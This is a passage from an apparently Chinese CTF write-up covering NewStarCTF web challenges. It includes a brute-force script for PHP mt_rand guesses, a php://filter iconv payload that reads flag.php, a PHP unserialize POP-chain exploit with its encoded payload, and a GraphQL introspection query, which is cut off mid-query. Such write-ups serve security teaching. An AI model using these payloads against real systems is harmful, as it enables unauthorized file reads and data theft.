class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">1145146</span>);<br><span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">100</span>;<span class="hljs-variable">$j</span>++)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;,&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;]&quot;</span>;<br></code></pre></td></tr></table></figure><p>生成一个随机数字典。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Author:ArushArk</span><br><span class="hljs-comment">#python Version:3.8</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>dic=[<span class="hljs-number">1219893521</span>,<span class="hljs-number">1202031004</span>,<span class="hljs-number">1198284468</span>,<span class="hljs-number">286494712</span>,<span class="hljs-number">349108173</span>,<span class="hljs-number">1809608970</span>,<span class="hljs-number">1296391305</span>,<span class="hljs-number">1584324323</span>,<span class="hljs-number">311687746</span>,<span class="hljs-number">754807714</span>,<span class="hljs-number">1378740435</span>,<span class="hljs-number">1240698142</span>,<span class="hljs-number">850902888</span>,<span class="hljs-number">448566404</span>,<span class="hljs-number">1361733834</span>,<span class="hljs-number">1778856200</span>,<span class="hljs-number">1988406778</span>,<span class="hljs-number">1495264972</span>,<span class="hljs-number">1903272977</span>,<span class="hljs-number">58703413</span>,<span class="hljs-number">455580500</span>,<span class="hljs-number">1994516472</span>,<span class="hljs-number">816312968</span>,<span class="hljs-number">994125629</span>,<span class="hljs-number">51000526</span>,<span class="hljs-number">1676697449</span>,<span class="hljs-number">2041901805</span>,<span class="hljs-number">885667731</span>,<span class="hljs-number">1975663876</span>,<span class="hljs-number">734568242</span>,<span class="hljs-number">1323724304</span>,<span class="hljs-number">514265464</span>,<span class="hljs-number">236330101</span>,<span class="hljs-number">663707652</span>,<span class="hljs-number">1977098975</span>,<span class="hljs-number">1690359952</span>,<span class="hljs-number">521724654</span>,<span class="hljs-number">1817388172</span>,<span class="hljs-number">1695731145</span>,<span class="hljs-number">1225295724</span>,<span class="hljs-number">721542804</span>,<span class="hljs-number">254967530</span>,<span class="hljs-number">1028756011</span>,<span class="hljs-number">722379886</span>,<span class="hljs-number">335504268</span>,<span class="hljs-number">2129052130</span>,<span class="hljs-number">518286441</span>,<span class="hljs-number">1145042458</span>,<span class="hljs-number">531287820</span>,<span class="hljs-number">453239803</span>,<span class="hljs-number">884208358</span>,<span class="hljs-number">1803552100</span>,<span class="hljs-number">1229893025</span>,<span class="hljs-number">392415361</span>,<span class="hljs-number">285866846</span>,<span class="hljs-number">2016666724</span>,<span class="hljs-number">1558579835</span>,<span class="hljs-number">737190787</span>,<span class="hljs-number">1159720158</span>,<span class="hljs-number">1605504365</span>,<span class="hljs-number">1695906080</span>,<span class="hljs-number">1583216827</span>,<span class="hljs-number">1642926236</span>,<span class="hljs-number">2093852408</span>,<span class="hljs-number">406828797</span>,<span class="hljs-number">1052602660</span>,<span class="hljs-number">1042379469</span>,<span class="hljs-number">559390831</span>,<span class="hljs-number">254364212</span>,<span class="hljs-number">1601070263</span>,<span class="hljs-number">277797425</span>,<span class="hljs-number">668692328</span>,<span class="hljs-number">92642236</span>,<span class="hljs-number">645983585</span>,<span class="hljs-number">1529397220</span>,<span class="hljs-number">1149456801</span>,<span class="hljs-number">647566221</span>,<span class="hljs-number">1531730989</span>,<span class="hljs-number">593862593</span>,<span class="hljs-number">2083289232</span>,<span class="hljs-number">841560123</span>,<span class="hljs-number">1605162447</span>,<span class="hljs-number">844412911</span>,<span class="hljs-number">1699087969</span>,<span class="hljs-number">282286477</span>,<span class="hljs-number">1626489409</span>,<span class="hljs-number">608251064</span>,<span class="hljs-number">1641062602</span>,<span class="hljs-number">726736835</span>,<span class="hljs-number">1915814566</span>,<span class="hljs-number">804749745</span>,<span class="hljs-number">602578647</span>,<span class="hljs-number">977805082</span>,<span class="hljs-number">1152809971</span>,<span class="hljs-number">1501425859</span>,<span class="hljs-number">1703850369</span>,<span class="hljs-number">601482747</span>,<span class="hljs-number">1945550466</span>,<span class="hljs-number">413084764</span>,<span class="hljs-number">1927092530</span>,]<br>url = <span class="hljs-string">&quot;http://adc0e541-3e32-4478-9a63-50bd9bc98866.node4.buuoj.cn:81/&quot;</span><br>headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://adc0e541-3e32-4478-9a63-50bd9bc98866.node4.buuoj.cn:81&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://adc0e541-3e32-4478-9a63-50bd9bc98866.node4.buuoj.cn:81/&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>data = &#123;<span class="hljs-string">&quot;guess&quot;</span>: <span class="hljs-built_in">str</span>(i)&#125;<br>re=requests.post(url, headers=headers, data=data)<br>time.sleep(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;1219893521&lt;br&gt;Baby&quot;</span> <span class="hljs-keyword">in</span> re.text:<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>爆破出当前题目的伪随机数。</p><p>构造payload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">GET</span><span class="hljs-symbol">:<span class="hljs-string">?f</span>ile=php</span><span class="hljs-symbol">://filter/read=convert</span>.iconv.<span class="hljs-variable constant_">UCS</span>-2LE.<span class="hljs-variable constant_">UCS</span>-2BE/NewStar/resource=flag.php<br><span class="hljs-variable constant_">POST</span><span class="hljs-symbol">:guess=</span><span class="hljs-number">1202031004</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209271747905.png" alt="image-20220927174716579"></p><p>base用convert.iconv.UCS-2LE.UCS-2BE绕过，NewStar直接在中间加一个，不影响</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209271749208.png" alt="image-20220927174908126"></p><p>还需要一步解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;?&lt;hp p//lfga3&#123;fbe13f-3166c4-04-e58cfc-664c98a4a9&#125;0&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;UCS-2BE&#x27;</span>, <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>即可得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//flag&#123;3bf1ef33-61c6-440e-85fc-c66c4894a9a0&#125;[Finished in 0.3s]</span><br></code></pre></td></tr></table></figure><h2 id="UnserializeOne"><a href="#UnserializeOne" class="headerlink" title="UnserializeOne"></a>UnserializeOne</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">PHP反序列化漏洞系列第一题<br></code></pre></td></tr></table></figure><p>clone当调用clone方法时触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>pop链</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">start</span> __destruct ---&gt;</span>  <span class="hljs-function"><span class="hljs-title">sec</span> __toString ---&gt;</span>  <span class="hljs-function"><span class="hljs-title">easy</span> __call  ---&gt;</span>  <span class="hljs-function"><span class="hljs-title">eeee</span> __clone   ---&gt;</span>   S<span class="hljs-function"><span class="hljs-title">tart</span> __isset  ---&gt;</span>  Sec  __invoke<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-variable">$b</span>-&gt;name=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Easy</span>();<br><span class="hljs-variable">$c</span>-&gt;obj=<span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$obk</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">eeee</span>();<br><span class="hljs-variable">$haha</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-variable">$obl</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$obl</span>-&gt;func=<span class="hljs-variable">$haha</span>;<br><span class="hljs-variable">$obk</span>-&gt;obj=<span class="hljs-variable">$obl</span>;<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-keyword">var</span>=<span class="hljs-variable">$obk</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pop</span>=O%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Start%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Sec%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>obj%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Easy%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cla%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>var%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>eeee%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>obj%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Start%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>func%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Sec%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>obj%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>var%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>func%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209271947272.png" alt="image-20220927194728158"></p><h2 id="ezAPI"><a href="#ezAPI" class="headerlink" title="ezAPI"></a>ezAPI</h2><p>发现<a href="http://www.zip/">www.zip</a></p><p>在源码里发现如下语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]) ? <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>] : <span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&#123;&quot;query&quot;:&quot;query&#123;\nusers_user_by_pk(id:&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;) &#123;\nname\n&#125;\n&#125;\n&quot;, &quot;variables&quot;:null&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>得到查询语句</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren">&#123;<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;query&#123;<span class="hljs-char escape_">\n</span>users_user_by_pk(id:&#x27; . $id . &#x27;) &#123;<span class="hljs-char escape_">\n</span>name<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&quot;</span>, <span class="hljs-string">&quot;variables&quot;</span>:<span class="hljs-literal">null</span>&#125;<br></code></pre></td></tr></table></figure><p>传参data试了一下</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">id</span><span class="hljs-operator">=</span><span class="hljs-number">999</span><span class="hljs-operator">&amp;</span><span class="hljs-variable">data</span><span class="hljs-operator">=</span>&#123;<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;query&#123;<span class="hljs-char escape_">\n</span>users_user_by_pk(id:1)&#123;<span class="hljs-char escape_">\n</span>name<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&quot;</span>,<span class="hljs-string">&quot;variables&quot;</span>:<span class="hljs-literal">null</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209272042008.png" alt="image-20220927204200375"></p><p>搜索graphql得到如下payload（需要整理一下）</p><p><a href="https://www.secpulse.com/archives/148242.html">原文链接</a></p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren">&#123;<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\n</span>    query IntrospectionQuery &#123;<span class="hljs-char escape_">\n</span>      __schema &#123;<span class="hljs-char escape_">\n</span>        queryType &#123; name &#125;<span class="hljs-char escape_">\n</span>        mutationType &#123; name &#125;<span class="hljs-char escape_">\n</span>        subscriptionType &#123; name &#125;<span class="hljs-char escape_">\n</span>        types &#123;<span class="hljs-char escape_">\n</span>          ...FullType<span class="hljs-char escape_">\n</span>        &#125;<span class="hljs-char escape_">\n</span>        directives &#123;<span class="hljs-char escape_">\n</span>          name<span class="hljs-char escape_">\n</span>          description<span class="hljs-char escape_">\n</span>          locations<span class="hljs-char escape_">\n</span>          args &#123;<span class="hljs-char escape_">\n</span>            ...InputValue<span class="hljs-char escape_">\n</span>          &#125;<span class="hljs-char escape_">\n</span>        &#125;<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>    &#125;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>    fragment FullType on __Type &#123;<span class="hljs-char escape_">\n</span>      kind<span class="hljs-char escape_">\n</span>      name<span class="hljs-char escape_">\n</span>      description<span class="hljs-char escape_">\n</span>      fields(includeDeprecated: true) &#123;<span class="hljs-char escape_">\n</span>        name<span class="hljs-char escape_">\n</span>        description<span class="hljs-char escape_">\n</span>        args &#123;<span class="hljs-char escape_">\n</span>          ...InputValue<span class="hljs-char escape_">\n</span>        &#125;<span class="hljs-char escape_">\n</span>        type &#123;<span class="hljs-char escape_">\n</span>          ...TypeRef<span class="hljs-char escape_">\n</span>        &#125;<span class="hljs-char escape_">\n</span>        isDeprecated<span class="hljs-char escape_">\n</span>        deprecationReason<span 